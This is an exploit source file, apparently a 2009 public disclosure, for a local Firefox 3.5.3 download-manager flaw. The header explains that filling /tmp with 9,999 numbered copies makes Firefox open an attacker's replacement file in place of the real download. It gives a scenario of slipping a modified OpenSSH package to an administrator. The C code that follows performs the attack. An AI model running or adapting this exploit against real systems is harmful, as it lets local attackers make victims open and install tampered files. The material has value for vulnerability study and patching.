/*
getunique.c
AKA
Mozilla Firefox 3.5.3 Local Download Manager Exploit

Jeremy Brown [0xjbrown41@gmail.com // jbrownsec.blogspot.com // krakowlabs.com] 10.28.2009

************************************************************************************************************
When downloading files through Firefox and choosing the "Open with" option, Firefox will create a temporary
file in the form of RANDOM.part ("RANDOM" is random alphanumeric characters and ".part" is the extension).
When the download completes, Firefox saves the completed file in the "/tmp" directory as its original
filename and opens it with the program's handler (for example, Ark for compressed archives, VLC for .mp3,
WINE for .exe, etc).

Now, what if there is already a file with an identical filename in the temporary file directory? Firefox
uses the scheme of saving and opening the completed download as "/tmp/file-#.zip", where "file" is the
file's name, "-#" is a dash and the next available number in order, and ".zip" is of course the file's
extension. So if "/tmp/file.zip" already exists and the user tries to download a file with the same name,
Firefox saves and opens the newly downloaded file as "/tmp/file-1.zip". That scheme looked suspicious to me,
and raised a couple good questions.

1) What is the maximum number in the filename?
2) What happens when it reaches that maximum number?

Testing has proved that 9999, for example "/tmp/file-9999.zip", is the maximum number Firefox will use to
deal with identical "Open with" filenames. Instead of using "/tmp/file-10000.zip", Firefox will just use
the original identical file instead of the one it was supposed to download and open. That can get dangerous
when local users can write to "/tmp" just like everybody else :)

To exploit this situation, we need to know the filename that will be downloaded ahead of time. Then it is
just a matter of creating the excess files, placing our "replacement" file (with the identical filename) in
"/tmp", and waiting for the target user to use the "Open with" option to download a file. A file of our
choosing will appear in the download history (as a "ghost pointer", one mozilla guy noted). If the file
doesn't automatically open (as most testing shows), then the average user is going to simply double click on
the pointer in history anyways, opening our replacement file. We wouldn't even nessesarily have to know
"ahead of time". According to how long it would take to complete the download (remember Firefox is writing to
"/tmp/RANDOM.part" until its finished downloading), we could do our business while the file is still
downloading (again, as long as we know its filename).

There are many scenarios where we could leverage this vulnerability... here is one example.

* Administrator is downloading openssh-5.2.tar.gz
* We run the exploit to replace openssh-5.2.tar.gz with a modified version
* Administrator installs our OpenSSH 5.2 with our _modifications_

The download history will still show the name of the site that supplied the original file and the original
filename even when the target user opened the our replacement file instead.

Conditions that have to be met for exploitation to succeed:

1. The ability to write in the temporary file directory, "/tmp" by default on Linux
   (shell, ftp, etc with write permissions could be helpful for making this work remotely)
2. The target user chooses to download the file and chooses the "Open with" preference
3. The target user also has to double click the file in the download manager (in previous testing, if I recall
   correctly, the file opened automatically, as normal behavior; but that can no longer be confirmed)

Firefox on Windows has slightly different results. I found during testing that when the download completes,
the right file will be opened. Although unreliable, we were able to get the history of the file in download
manager to show the replacement file and it will be opened if the user chooses to open it from there.
Exploitation on Windows would be limited anyways due to the fact that you don't usually see as much remote
access to do local things on Windows as its fairly common on Linux. On Linux it is also common for the
replacement file to be kept in history when using this exploit, which can be useful for helping play off the
exploit when you don't want the target to think anything much is out of the ordinary :)

mozilla-1.9.1/xpcom/io/nsLocalFileCommon.cpp -> LINES [85-174]:

NS_IMETHODIMP
nsLocalFile::CreateUnique(PRUint32 type, PRUint32 attributes)
{
    nsresult rv;
    PRBool longName;

#ifdef XP_WIN
    nsAutoString pathName, leafName, rootName, suffix;
    rv = GetPath(pathName);
#else
    nsCAutoString pathName, leafName, rootName, suffix;
    rv = GetNativePath(pathName);
#endif
    if (NS_FAILED(rv))
        return rv;

    longName = (pathName.Length() + kMaxSequenceNumberLength >
                kMaxFilenameLength);
    if (!longName)
    {
        rv = Create(type, attributes);
        if (rv != NS_ERROR_FILE_ALREADY_EXISTS)
            return rv;
    }

#ifdef XP_WIN
    rv = GetLeafName(leafName);
    if (NS_FAILED(rv))
        return rv;

    const PRInt32 lastDot = leafName.RFindChar(PRUnichar('.'));
#else
    rv = GetNativeLeafName(leafName);
    if (NS_FAILED(rv))
        return rv;

    const PRInt32 lastDot = leafName.RFindChar('.');
#endif

    if (lastDot == kNotFound)
    {
        rootName = leafName;
    }
    else
    {
        suffix = Substring(leafName, lastDot);      // include '.'
        rootName = Substring(leafName, 0, lastDot); // strip suffix and dot
    }

    if (longName)
    {
        PRUint32 maxRootLength = (kMaxFilenameLength -
                                  (pathName.Length() - leafName.Length()) -
                                  suffix.Length() - kMaxSequenceNumberLength);
#ifdef XP_WIN
        // ensure that we don't cut the name in mid-UTF16-character
        rootName.SetLength(NS_IS_LOW_SURROGATE(rootName[maxRootLength]) ?
                           maxRootLength - 1 : maxRootLength);
        SetLeafName(rootName + suffix);
#else
        if (NS_IsNativeUTF8())
            // ensure that we don't cut the name in mid-UTF8-character
            while (UTF8traits::isInSeq(rootName[maxRootLength]))
                --maxRootLength;
        rootName.SetLength(maxRootLength);
        SetNativeLeafName(rootName + suffix);
#endif
        nsresult rv = Create(type, attributes);
        if (rv != NS_ERROR_FILE_ALREADY_EXISTS)
            return rv;
    }

    for (int indx = 1; indx < 10000; indx++)
    {
        // start with "Picture-1.jpg" after "Picture.jpg" exists
#ifdef XP_WIN
        SetLeafName(rootName +
                    NS_ConvertASCIItoUTF16(nsPrintfCString("-%d", indx)) +
                    suffix);
#else
        SetNativeLeafName(rootName + nsPrintfCString("-%d", indx) + suffix);
#endif
        rv = Create(type, attributes);
        if (NS_SUCCEEDED(rv) || rv != NS_ERROR_FILE_ALREADY_EXISTS)
            return rv;
    }

    // The disk is full, sort of
    return NS_ERROR_FILE_TOO_BIG;
}

That codes gives us a good look at how the scheme works.

I tested the "Save As" option and it doesn't seem to be vulnerable (it saved, for example, file(1000000).zip).

Yes, the header is roughly 3 times as many lines as the actual exploit code, but hey, this bug has a lot of
details and ideas but is also very simple to exploit.

linux@ubuntu:~$ ./getunique right zip /home/linux/Desktop/wrong.zip
(target downloads right.zip and opens it the same filename, but with wrong.zip's contents)

Muy Bueno :)

Thunderbird doesn't seems to respond by not responding to the open when running the exploit. This code looks
like its shared across Mozilla's codebase, so other applications like the SeaMonkey suite may be vulnerable
as well. Mozilla also seems handle certain file types like tar.gz and tar.bz2 differently, see the code for
more information.. you may even have to double click the file's entry in download manager if Firefox doesn't
automatically open it. One way or another, though, this vulnerability is decently reliable, on Linux at least.
************************************************************************************************************
getunique.c
*/

#ifdef WIN32
#include <stdio.h>
#include <windows.h>
#else
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#endif

#define MAGICN 9999

#define TMPLIN "/tmp"
#define TMPWIN "C:\\Documents and Settings\\Administrator\\Local Settings\\Temp"

void usage(char *app)
{

     printf("\nMozilla Firefox 3.5.3 Local Download Manager Exploit");
     printf("\nUsage: %s <target filename> <extension> <replacement file>\n\n", app);

     exit(0);

}

int main(int argc, char *argv[])
{

char buf[256], *fn = argv[1], *ext = argv[2], *rf = argv[3];
int i;
FILE *fd;

if(argc < 3) usage(argv[0]);

#ifdef WIN32
     snprintf(buf, sizeof(buf), "%s\\%s.%s", TMPWIN, fn, ext);
     CopyFile(rf, buf, FALSE);
#else
     snprintf(buf, sizeof(buf), "/bin/cp %s %s/%s.%s", rf, TMPLIN, fn, ext);
     system(buf);
#endif

for(i = 1; i <= MAGICN; i++)
{

     memset(buf, 0, sizeof(buf));
#ifdef WIN32
     snprintf(buf, sizeof(buf), "%s\\%s-%d.%s", TMPWIN, fn, i, ext);
#else
     snprintf(buf, sizeof(buf), "%s/%s-%d.%s", TMPLIN, fn, i, ext); // default
//     snprintf(buf, sizeof(buf), "%s/%s.tar-%d.gz", TMPLIN, fn, i); // for tar.gz files
//     snprintf(buf, sizeof(buf), "%s/%s.tar-%d.bz2", TMPLIN, fn, i); // for tar.bz2 files
//     snprintf(buf, sizeof(buf), "%s/%s(%d).%s", TMPLIN, fn, i, ext); // for testing "Save As"
#endif
     fd = fopen(buf, "w");
     fclose(fd);

}

     return 0;

}

